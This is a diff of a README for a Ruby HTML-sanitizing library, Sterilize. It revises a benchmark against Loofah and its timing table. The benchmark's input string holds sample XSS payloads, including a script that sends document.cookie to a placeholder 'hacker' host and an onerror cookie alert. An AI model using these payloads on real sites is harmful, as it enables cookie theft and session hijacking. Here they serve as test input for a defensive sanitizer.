@@ -13,15 +13,16 @@ Take a look at the specs directory to see some of the cases that get handled. Th
 Finally, Sterilize is _fast_.
 
 ```ruby
-unsafe_string = "I am nice safe user input, nothing to see here.. <script>console.log('installing bitcoin miner')</script><SCRIPT>var+img=new+Image();img.src='http://hacker/'%20+%20document.cookie;</SCRIPT><img src='http://url.to.file.which/not.exist' onerror=alert(document.cookie);><a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgna25pZ2h0c3RpY2sgd2FzIGhlcmUnKTwvc2NyaXB0Pg=='>HACK HACK HACK</a>" * 10000
+unsafe_string = "I am nice safe user input, nothing to see here.. <script>console.log('installing bitcoin miner')</script><SCRIPT>var+img=new+Image();img.src='http://hacker/'%20+%20document.cookie;</SCRIPT><img src='http://url.to.file.which/not.exist' onerror=alert(document.cookie);><a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgna25pZ2h0c3RpY2sgd2FzIGhlcmUnKTwvc2NyaXB0Pg=='>HACK HACK HACK</a>" * 1000
+
 
 Benchmark.bm do | benchmark |
-  benchmark.report("Sterilize") do
+  benchmark.report("Sterilize#perform") do
     50.times do
       Sterilize.perform(unsafe_string)
     end
   end
-  benchmark.report("Loofah") do
+  benchmark.report("Loofah.scrub_fragment(unsafe_string, :prune).to_str") do
     50.times do
       Loofah.scrub_fragment(unsafe_string, :prune).to_str
     end
@@ -29,12 +30,12 @@ Benchmark.bm do | benchmark |
 end
 ```
 
-As you can see, Sterilize can operate significatnly faster. As with all benchmarks though, your mileage may vary and it's important to see how things work in practice for you.
+As you can see, Sterilize can operate significatnly faster (somewhere in the ballpark of 9-10 times faster). As with all benchmarks though, your mileage may vary and it's important to see how things work in practice for you.
 
-| Library   | user       | system   | total      | real         |
-| --------- | ---------- | -------- | ---------- | ------------ |
-| Sterilize | 74.585432  | 0.250712 | 74.836144  | ( 75.194400) |
-| Loofah    | 110.456900 | 0.619901 | 111.076801 | (111.206092) |
+| Library                                             | user       | system   | total      | real         |
+| --------------------------------------------------- | ---------- | -------- | ---------- | ------------ |
+| Sterilize#perform                                   | 1.284460   | 0.006097 | 1.290557   | ( 1.295062)  |
+| Loofah.scrub_fragment(unsafe_string, :prune).to_str | 10.183802  | 0.064826 | 10.248628  | ( 10.274430) |
 
 ## Installation
 
